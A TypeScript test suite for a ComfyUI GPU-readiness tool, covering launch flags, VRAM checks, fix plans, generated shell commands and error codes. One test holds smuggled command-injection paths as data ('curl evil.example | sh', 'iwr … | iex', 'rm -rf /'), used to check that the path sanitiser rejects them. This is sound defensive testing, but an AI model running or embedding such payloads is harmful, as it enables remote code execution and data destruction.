import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { parseArgv } from "@/lib/gpu/argv";
import { emptyInventory } from "@/lib/gpu/gather";
import { commandsFor, safePath } from "@/lib/gpu/commands";
import { fixFromPromptError, isOutOfMemory } from "@/lib/gpu/fix-codes";
import { etaRange, fixPlan, whyOf } from "@/lib/gpu/plan";
import { badgeOf, filePresence, stepCount, toolReadiness, vramFit, workflowReadiness, worse } from "@/lib/gpu/readiness";
import { compareVersions, parseIndex, sameName } from "@/lib/gpu/requirements";
import type { GpuInventory, RequirementIndex } from "@/lib/gpu/types";
import { resolveWorkflowId } from "@/lib/comfy-variants";

const idx: RequirementIndex = parseIndex(JSON.parse(fs.readFileSync(path.join(process.cwd(), "workflows/comfyui/requirements.json"), "utf8")));
const GB = 2 ** 30;

/** An inventory with everything the given workflows need, on a card of `vram` GB. */
function inventory(ids: string[], o: { vram?: number; type?: string; os?: string; version?: string } = {}): GpuInventory {
  const inv = emptyInventory("server", 1);
  inv.reachable = true;
  inv.comfy = { version: o.version ?? "0.42.1", os: o.os ?? "posix", embeddedPython: false, deployEnv: "local-git", flags: parseArgv(["main.py"]) };
  inv.devices = o.type === "none" ? [] : [{ name: "cuda:0 NVIDIA GeForce RTX 4090 : cudaMallocAsync", type: o.type ?? "cuda", index: 0, vramTotal: (o.vram ?? 24) * GB, vramFree: 0 }];
  inv.manager = { api: "none" };
  inv.nodes = { have: [], missing: [], total: 0, readAt: 1, how: "object_info" };
  const all = new Set<string>();
  for (const w of Object.values(idx.workflows)) {
    w.core.forEach((c) => all.add(c));
    Object.values(w.packs).forEach((cs) => cs.forEach((c) => all.add(c)));
  }
  const have = new Set<string>();
  for (const id of ids) {
    const w = idx.workflows[id];
    w.core.forEach((c) => have.add(c));
    Object.values(w.packs).forEach((cs) => cs.forEach((c) => have.add(c)));
  }
  inv.nodes.have = [...all].filter((c) => have.has(c));
  inv.nodes.missing = [...all].filter((c) => !have.has(c));
  for (const folder of idx.folders) inv.models[folder] = { have: {}, total: 0 };
  for (const id of ids)
    for (const k of idx.workflows[id].files) {
      const f = idx.files[k];
      inv.models[f.folder].have[f.file] = f.sizeBytes;
      for (const [cls, input] of f.loaders ?? []) (inv.combos[`${cls}.${input}`] ??= []).push(f.file);
    }
  // Loader combos for every loader the index reads (empty unless a file is there).
  for (const f of Object.values(idx.files)) for (const [cls, input] of f.loaders ?? []) inv.combos[`${cls}.${input}`] ??= [];
  return inv;
}

const Z = "z-image-turbo-t2i";
const ctx = { account: true };

describe("launch flags (§6.1)", () => {
  it("reads --flag value and --flag=value", () => {
    expect(parseArgv(["main.py"]).loopbackOnly).toBe(true);
    expect(parseArgv(["main.py"]).listen).toBeNull();
    expect(parseArgv(["main.py", "--listen"]).listen).toBe("0.0.0.0,::");
    expect(parseArgv(["main.py", "--listen", "--port", "8188"]).loopbackOnly).toBe(false);
    expect(parseArgv(["main.py", "--listen", "127.0.0.1"]).loopbackOnly).toBe(true);
    expect(parseArgv(["main.py", "--listen=127.0.0.1,::1"]).loopbackOnly).toBe(true);
    expect(parseArgv(["main.py", "--listen=0.0.0.0"]).loopbackOnly).toBe(false);
    expect(parseArgv(["main.py", "--enable-cors-header"]).corsOrigin).toBe("*");
    expect(parseArgv(["main.py", "--enable-cors-header", "https://fuobe.com"]).corsOrigin).toBe("https://fuobe.com");
    expect(parseArgv(["main.py", "--enable-cors-header=https://x.example"]).corsOrigin).toBe("https://x.example");
    expect(parseArgv(["main.py", "--enable-manager"]).enableManager).toBe(true);
    expect(parseArgv(["main.py", "--enable-manager-legacy-ui"])).toMatchObject({ enableManager: false, managerLegacyUi: true });
    expect(parseArgv(["main.py", "--lowvram"]).lowvram).toBe(true);
    expect(parseArgv(["main.py", "--novram"]).lowvram).toBe(true);
    expect(parseArgv(["main.py", "--cpu"]).cpuOnly).toBe(true);
    expect(parseArgv("not a list").loopbackOnly).toBe(true);
  });
});

describe("readiness (§7)", () => {
  it("is ready when everything is there, and unknown when ComfyUI didn't answer", () => {
    expect(workflowReadiness(Z, inventory([Z]), idx, ctx).state).toBe("ready");
    const off = inventory([Z]);
    off.reachable = false;
    expect(workflowReadiness(Z, off, idx, ctx).state).toBe("unknown");
  });

  it("grades graphics memory: 12 GB, 24 GB, 32 GB, CPU only and Apple", () => {
    expect(vramFit(24, inventory([], { vram: 12 })).fit).toBe("no");
    expect(vramFit(24, inventory([], { vram: 24 })).fit).toBe("fits");
    expect(vramFit(24, inventory([], { vram: 32 })).fit).toBe("fits");
    expect(vramFit(24, inventory([], { type: "cpu" })).fit).toBe("no");
    expect(vramFit(0, inventory([], { type: "cpu" })).fit).toBe("any");
    expect(vramFit(16, inventory([], { type: "mps", vram: 32 }))).toMatchObject({ fit: "fits", apple: true });
  });

  it("has a tight band from 0.66 × the need up to the need", () => {
    const need = 25;
    const at = (gb: number) => vramFit(need, inventory([], { vram: gb })).fit;
    expect(at(need * 0.66)).toBe("tight");
    expect(at(need * 0.66 - 0.5)).toBe("no");
    expect(at(need)).toBe("fits");
  });

  it("never blocks on graphics memory alone: a short card is 'gpu', not a step", () => {
    const r = workflowReadiness(Z, inventory([Z], { vram: 4 }), idx, ctx);
    expect(r.state).toBe("gpu");
    expect(r.needs).toEqual([]);
  });

  it("says update ComfyUI only when it is older than the minimum, else names the built-in nodes that didn't load", () => {
    const w = idx.workflows[Z];
    const old = inventory([Z], { version: "0.3.40" });
    old.nodes.missing.push(w.core[0]);
    old.nodes.have = old.nodes.have.filter((c) => c !== w.core[0]);
    expect(workflowReadiness(Z, old, idx, ctx).needs[0].kind).toBe("comfy-update");
    const fresh = inventory([Z]);
    fresh.nodes.missing.push(w.core[0]);
    fresh.nodes.have = fresh.nodes.have.filter((c) => c !== w.core[0]);
    const need = workflowReadiness(Z, fresh, idx, ctx).needs[0];
    expect(need.kind).toBe("core-missing");
    expect(need.detail).toMatch(/IMPORT FAILED/);
  });

  it("tells a missing pack, an installed one waiting for a restart, a partial one and a broken one apart", () => {
    const id = Object.keys(idx.workflows).find((k) => Object.keys(idx.workflows[k].packs).length === 1 && Object.values(idx.workflows[k].packs)[0].length >= 2 && !idx.workflows[k].isolated)!;
    const [pack, classes] = Object.entries(idx.workflows[id].packs)[0];
    const without = () => {
      const inv = inventory([id]);
      inv.nodes.have = inv.nodes.have.filter((c) => !classes.includes(c));
      inv.nodes.missing.push(...classes);
      return inv;
    };
    const kinds = (inv: GpuInventory) => workflowReadiness(id, inv, idx, ctx).needs.map((n) => n.kind);
    expect(kinds(without())).toEqual(expect.arrayContaining(["pack-install", "restart"]));
    const installed = without();
    installed.packs[pack] = { dir: pack, enabled: true };
    expect(kinds(installed)).toEqual(["restart"]);
    expect(stepCount(workflowReadiness(id, installed, idx, ctx).needs)).toBe(1);
    const broken = without();
    broken.packs[pack] = { dir: pack, enabled: true, importError: "Traceback…" };
    expect(kinds(broken)).toContain("pack-repair");
    const partial = inventory([id]);
    partial.nodes.have = partial.nodes.have.filter((c) => c !== classes[0]);
    partial.nodes.missing.push(classes[0]);
    expect(kinds(partial)).toContain("pack-update");
  });

  it("finds files by their loader, in subfolders, with the letter case the OS uses", () => {
    const inv = inventory([]);
    const f = idx.files[idx.workflows[Z].files[0]];
    const [cls, input] = f.loaders![0];
    inv.combos[`${cls}.${input}`] = [f.file];
    expect(filePresence(f, inv)).toBe("present");
    // Listing only (no loader read): a subfolder name counts, case by OS.
    const listed = inventory([]);
    listed.combos = {};
    listed.models[f.folder].have[f.file] = f.sizeBytes;
    expect(filePresence(f, listed)).toBe("present");
    expect(sameName("nt")("A.safetensors", "a.SAFETENSORS")).toBe(true);
    expect(sameName("posix")("A.safetensors", "a.safetensors")).toBe(false);
  });

  it("says a short file is a partial download", () => {
    const inv = inventory([Z]);
    const f = idx.files[idx.workflows[Z].files[0]];
    inv.models[f.folder].have[f.file] = Math.floor(f.sizeBytes * 0.5);
    const r = workflowReadiness(Z, inv, idx, ctx);
    expect(r.needs.map((n) => n.kind)).toContain("model-replace");
  });

  it("never counts what wasn't read as missing (R11)", () => {
    const inv = inventory([]);
    inv.combos = {};
    inv.models = {};
    inv.nodes = { have: [], missing: [], total: 0, readAt: 1, how: "per-class" };
    expect(workflowReadiness(Z, inv, idx, ctx).state).toBe("ready");
  });

  it("puts a pack's model after the pack: not an error while its folder isn't there yet", () => {
    const id = Object.keys(idx.workflows).find((k) => idx.workflows[k].files.some((f) => idx.files[f].packFolder) && !idx.workflows[k].isolated)!;
    const inv = inventory([]);
    const r = workflowReadiness(id, inv, idx, ctx);
    expect(r.needs.some((n) => n.kind === "model")).toBe(true);
    const plan = fixPlan(toolReadiness(`workflow:${id}`, id, [id], [], inv, idx, ctx), inv, idx, { hash: (s) => s.length.toString(), urlHash: "u", account: true });
    const order = plan.steps.map((s) => s.kind);
    expect(order.lastIndexOf("pack-install")).toBeLessThan(order.indexOf("model"));
  });

  it("asks for the licence of gated files", () => {
    const gated = Object.entries(idx.files).find(([, f]) => f.gated)!;
    const id = Object.keys(idx.workflows).find((k) => idx.workflows[k].files.includes(gated[0] as never))!;
    const r = workflowReadiness(id, inventory([]), idx, ctx);
    expect(r.needs.some((n) => n.kind === "hf-licence")).toBe(true);
  });

  it("isolated workflows: unsupported on an account's GPU; the owner without a worker gets a step", () => {
    const id = Object.keys(idx.workflows).find((k) => idx.workflows[k].isolated)!;
    expect(workflowReadiness(id, inventory([id]), idx, { account: true }).state).toBe("unsupported");
    expect(workflowReadiness(id, inventory([id]), idx, { account: false }).needs.map((n) => n.kind)).toContain("isolated-worker");
    expect(workflowReadiness(id, inventory([id]), idx, { account: false, isolatedUrl: true }).needs).toEqual([]);
  });

  it("deduplicates across workflows, adds LoRAs and keeps the first-run notes", () => {
    const ids = ["z-image-turbo-t2i", "z-image-turbo-i2i"].filter((k) => idx.workflows[k]);
    const inv = inventory([]);
    const t = toolReadiness("model:oss-z-image-turbo#t2i", "Z-Image Turbo", ids, [{ file: "look.safetensors", download: "direct", url: "https://huggingface.co/a/b/resolve/main/look.safetensors", sizeBytes: 1e8 }], inv, idx, ctx);
    const keys = t.needs.map((n) => n.key);
    expect(new Set(keys).size).toBe(keys.length);
    expect(keys).toContain("lora:look.safetensors");
    const civitai = toolReadiness("preset:x", "X", ids, [{ file: "c.safetensors", download: "civitai-token", url: "https://civitai.com/api/download/models/1" }], inv, idx, ctx);
    const plan = fixPlan(civitai, inv, idx, { hash: () => "h", urlHash: "u", account: true, loras: [{ file: "c.safetensors", download: "civitai-token", url: "https://civitai.com/api/download/models/1" }] });
    expect(plan.steps.find((s) => s.kind === "civitai-key")).toBeTruthy();
    expect(plan.steps.find((s) => s.kind === "lora")?.why).toBe("civitai-key");
  });

  it("ranks states worst first and encodes badges", () => {
    expect(worse("ready", "almost")).toBe("almost");
    expect(worse("gpu", "setup")).toBe("gpu");
    expect(worse("unknown", "unsupported")).toBe("unknown");
    const t = toolReadiness("model:oss-z-image-turbo#t2i", "Z", [Z], [], inventory([]), idx, ctx);
    const b = badgeOf(t)!;
    expect(["a", "s"]).toContain(b[0]);
    expect(b[2]).toBe(Math.round(t.downloadBytes / 1e8));
    const unknown = inventory([]);
    unknown.reachable = false;
    expect(badgeOf(toolReadiness("model:x#t2i", "X", [Z], [], unknown, idx, ctx))).toBeNull();
    expect(compareVersions("0.41.2", "0.41.0")).toBeGreaterThan(0);
    expect(compareVersions("v0.3.75", "0.41.0")).toBeLessThan(0);
  });
});

describe("fix plans (§8)", () => {
  const missing = () => toolReadiness("model:oss-z-image-turbo#t2i", "Z-Image Turbo", [Z], [], inventory([]), idx, ctx);

  it("estimates the time at 100 and 25 MB/s, rounded up", () => {
    expect(etaRange(0)).toEqual([0, 0]);
    expect(etaRange(12.3e9)).toEqual([3, 9]);
  });

  it("gives the same hash for the same plan, and a new one when anything changes", () => {
    const sha = (s: string) => crypto.createHash("sha256").update(s).digest("hex");
    const inv = inventory([]);
    const a = fixPlan(missing(), inv, idx, { hash: sha, urlHash: "u1", account: true });
    const b = fixPlan(missing(), inv, idx, { hash: sha, urlHash: "u1", account: true });
    expect(a.planHash).toBe(b.planHash);
    expect(fixPlan(missing(), inv, idx, { hash: sha, urlHash: "u2", account: true }).planHash).not.toBe(a.planHash);
    const fewer = { ...missing(), needs: missing().needs.slice(1) };
    expect(fixPlan(fewer, inv, idx, { hash: sha, urlHash: "u1", account: true }).planHash).not.toBe(a.planHash);
  });

  it("is manual in P1, and says why the way §8.2 would", () => {
    const inv = inventory([]);
    const p = fixPlan(missing(), inv, idx, { hash: () => "h", urlHash: "u", account: true });
    expect(p.oneClick).toBe("none");
    expect(p.steps.every((s) => s.via === "manual")).toBe(true);
    expect(p.why).toBe("no-manager");
    const model = p.steps.find((s) => s.kind === "model")!;
    inv.manager = { api: "v3" };
    expect(whyOf(model, inv, idx)).toBe("manager-v3-model-list");
    inv.manager = { api: "v4" };
    expect(whyOf(model, inv, idx)).toBe("manual-only");
    inv.comfy!.flags = parseArgv(["main.py", "--listen"]);
    expect(whyOf(model, inv, idx)).toBe("listen-all");
    const pack = { key: "pack:ComfyUI-KJNodes", kind: "pack-install" as const, label: "", detail: "", pack: "ComfyUI-KJNodes" };
    expect(whyOf(pack, inv, idx)).toBe("no-validated-version");
    expect(whyOf({ ...pack, pack: "h3_character_swap" }, inv, idx)).toBe("subfolder-pack");
    inv.manager = { api: "none" };
    expect(whyOf(pack, inv, idx)).toBe("no-manager");
  });

  it("never offers the cloud to an account, and never carries a token", () => {
    const t = { ...missing(), cloud: { modelId: "oss-z-image-turbo" } };
    expect(fixPlan(t, inventory([]), idx, { hash: () => "h", urlHash: "u", account: true }).alternatives.cloud).toBeUndefined();
    expect(fixPlan(t, inventory([]), idx, { hash: () => "h", urlHash: "u", account: false }).alternatives.cloud).toEqual({ modelId: "oss-z-image-turbo" });
    const p = fixPlan(missing(), inventory([]), idx, { hash: () => "h", urlHash: "u", account: true, loras: [{ file: "c.safetensors", download: "civitai-token", url: "https://civitai.com/api/download/models/1?token=SECRET" }] });
    expect(JSON.stringify(p)).not.toMatch(/token=|SECRET/);
  });
});

describe("commands (§8.3, review item 4)", () => {
  const steps = [{ kind: "model" as const, file: idx.workflows[Z].files[0] }, { kind: "pack-install" as const, pack: "ComfyUI-KJNodes" }, { kind: "restart" as const }];

  it("use $COMFY / $env:COMFY when the folders aren't known", () => {
    const c = commandsFor(steps, { inv: inventory([]), idx });
    expect(c.bash).toMatch(/^COMFY="\$HOME\/ComfyUI"/);
    expect(c.bash).toMatch(/curl -L -C - --fail -o "\$COMFY\/models\//);
    expect(c.bash).toMatch(/git clone https:\/\/github.com\/kijai\/ComfyUI-KJNodes "\$COMFY\/custom_nodes\/ComfyUI-KJNodes"/);
    expect(c.bash).toMatch(/git -C "\$COMFY\/custom_nodes\/ComfyUI-KJNodes" checkout [0-9a-f]{40}/);
    expect(c.powershell).toMatch(/^\$env:COMFY = "C:\\ComfyUI"/);
    expect(c.powershell).toMatch(/curl\.exe -L -C - --fail -o "\$env:COMFY\\models\\/);
    expect(c.bash).toContain("Press Ctrl+C");
  });

  it("use the real folders when ComfyUI names them, quoted, and the portable Python", () => {
    const inv = inventory([]);
    const f = idx.files[idx.workflows[Z].files[0]];
    inv.comfy = { ...inv.comfy!, os: "nt", embeddedPython: true, modelRoots: { [f.folder]: [`C:\\ComfyUI_windows_portable\\ComfyUI\\models\\${f.folder}`] } };
    const c = commandsFor(steps, { inv, idx });
    expect(c.powershell).toContain(`'C:\\ComfyUI_windows_portable\\ComfyUI\\models\\${f.folder}\\${f.file}'`);
    expect(c.powershell).toContain("& 'C:\\ComfyUI_windows_portable\\ComfyUI\\..\\python_embeded\\python.exe' -m pip install -r");
    expect(c.powershell).not.toContain("$env:COMFY =");
    expect(c.powershell).toContain("run_nvidia_gpu.bat");
  });

  it("fall back to $COMFY for hostile folder paths", () => {
    for (const bad of ['C:\\m"; iwr https://x/p | iex; "', "/home/$(whoami)/models", "/a;rm -rf /", "C:\\a`b", "/x\nrm"]) expect(safePath(bad)).toBeNull();
    const inv = inventory([]);
    const f = idx.files[idx.workflows[Z].files[0]];
    inv.comfy = { ...inv.comfy!, modelRoots: { [f.folder]: ['/srv/m"; curl evil.example | sh; "'], vae: ['C:\\m"; iwr https://x/p | iex; "'] } };
    const c = commandsFor(steps, { inv, idx });
    expect(c.bash).not.toMatch(/evil|iwr/);
    expect(c.powershell).not.toMatch(/evil|iwr/);
    expect(c.bash).toContain('"$COMFY/models/');
  });

  it("read tokens from the environment for gated files", () => {
    const gated = Object.keys(idx.files).find((k) => idx.files[k as keyof typeof idx.files].gated)!;
    const c = commandsFor([{ kind: "model", file: gated }], { inv: inventory([]), idx });
    expect(c.bash).toContain('-H "Authorization: Bearer $HF_TOKEN"');
    expect(c.powershell).toContain('-H "Authorization: Bearer $env:HF_TOKEN"');
  });
});

describe("failed runs get a code (§13.2)", () => {
  it("names the missing model or node class", () => {
    const f = idx.files[idx.workflows[Z].files[0]];
    const model = fixFromPromptError({ node_errors: { "3": { class_type: "UNETLoader", errors: [{ message: "Value not in list", extra_info: { received_value: f.file } }] } } }, Z, [{ file: f.file, folder: f.folder }], () => undefined);
    expect(model).toEqual({ code: "comfy_missing_model", workflowId: Z, items: [{ folder: f.folder, file: f.file }] });
    const node = fixFromPromptError({ error: { type: "missing_node_type", message: "Node 'GrowMaskWithBlur' not found", extra_info: { class_type: "GrowMaskWithBlur" } } }, "w", [], () => "ComfyUI-KJNodes");
    expect(node).toEqual({ code: "comfy_missing_node", workflowId: "w", items: [{ class: "GrowMaskWithBlur", pack: "ComfyUI-KJNodes" }] });
    expect(isOutOfMemory("torch.OutOfMemoryError: CUDA out of memory")).toBe(true);
  });
});

describe("variants resolve as prepareWorkflow runs them", () => {
  const has = (id: string) => !!idx.workflows[id];
  const base = { op: "i2v", clips: 0, images: 1, audio2: false, extra: {}, has };
  it("picks the pose, the product shot, EXR frames, the single-track mux and the clip count", () => {
    expect(resolveWorkflowId("wan22-i2v-14b", { ...base, extra: { cameraMotion: "dolly-in" } })).toBe("wan22-fun-camera-14b");
    expect(resolveWorkflowId("wan22-i2v-14b", base)).toBe("wan22-i2v-14b");
    expect(resolveWorkflowId("qwen-image-21-edit", { ...base, op: "edit", extra: { productShot: true } })).toBe("product-shot-qwen-edit-2509");
    expect(resolveWorkflowId("qwen-image-21-edit", { ...base, op: "edit", images: 2, extra: { productShot: true } })).toBe("qwen-image-21-edit");
    expect(resolveWorkflowId("video-concat-{n}", { ...base, op: "concat", clips: 3 })).toBe("video-concat-3");
    if (has("video-mux-audio-replace")) expect(resolveWorkflowId("video-mux-audio", { ...base, op: "mux" })).toBe("video-mux-audio-replace");
    if (has("video-export-exr")) expect(resolveWorkflowId("video-export-pro-chunked", { ...base, op: "export-video", format: "exr" })).toBe("video-export-exr");
  });
});
